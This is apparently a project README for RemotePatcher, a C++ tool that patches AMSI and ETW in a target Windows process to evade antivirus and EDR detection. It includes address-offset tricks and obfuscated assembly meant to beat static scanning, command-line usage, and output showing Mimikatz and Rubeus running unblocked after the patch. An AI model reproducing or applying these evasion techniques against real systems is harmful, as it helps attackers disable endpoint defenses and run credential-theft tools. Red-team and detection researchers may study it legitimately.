# RemotePatcher
I found that some EDR like Cortex XDR would pick up C# implemetation of AMSI/ETW patch functions. Instead of obfuscating someone's codes, I decided to write a tinny program to do the same thing, as well as practice C++ programming skill.



## A Little Twist

We could do a little twist to bypass static scan of AV.

**Calculating memory address**

Instead of getting the memory address of AMSIScanBuffer() and EtwEventWrite() directly, we could calculate it.

In amsi.dll, memory address of AMSIScanBuffer() is 0x1AF0 apart from DllRegisterServer()

```
void* dummyAddr = GetProcAddress(amsiDllHandle, "DllRegisterServer");
char* amsiAddr = (char*)dummyAddr + 6896;
```

In ntdll.dll, memory address of EtwEventWrite() is 0x15D0 apart from RtlSetLastWin32Error()

```
void* dummyAddr = GetProcAddress(ntDllHandle, "RtlSetLastWin32Error");
char* etwAddr = (char*)dummyAddr - 5584;
```

Remark: Tested on Windows 10 (Build 19043)



**Obtaining assembly code**

@RastaMouse's assembly code that commonly used

```
mov eax, 0x80070057
ret
```

Make a bit calucation but still do the same which return AMSI_RESULT_CLEAN

```
xor    eax,eax
add    eax,0x7dfdfe4e
add    eax,0x02090209
ret
```

Convert aeesmbly code to hex byte array [here](https://defuse.ca/online-x86-assembler.htm#disassembly)



## Usage

```
cmd> .\RemotePatcher.exe -h
RemotePatcher
More info: https://github.com/Hagrid29/RemotePatcher/
Options:
  --exe "[cmd]" the program that will be executed and patched
  --pid [pid]   the process ID that will be patched
  -a            to NOT patch AMSI
  -e            to NOT patch ETW
  -l            to NOT load amsi.dll
```

**Patch exiting process**

```
PS> "Invoke-Mimikatz"
At line:1 char:1
+ "Invoke-Mimikatz"
+ ~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS> $pid
9756
PS> .\RemotePatcher.exe --pid 9756 -l
[+] Patched etw!
[+] Patched amsi!
PS> "Invoke-Mimikatz"
Invoke-Mimikatz
```

**Start a new program**

CSLoader.exe is a C# binary of [NetLoader](https://github.com/Flangvik/NetLoader) with AMSI/ETW patch functions removed.

```
.\RemotePatcher.exe --exe ".\CSLoader.exe --path rubeus.txt --key mykey --args hash /password:aaa"
[+] Patched etw!
[+] Patched amsi!
[+] Decrypting using key 'mykey'
[+] PATH : ru.txt
[+] Arguments : hash /password:aaa
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : aaa
[*]       rc4_hmac             : E24106942BF38BCF57A6A4B29016EFF6

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```



## References

* https://rastamouse.me/memory-patching-amsi-bypass/
* https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/



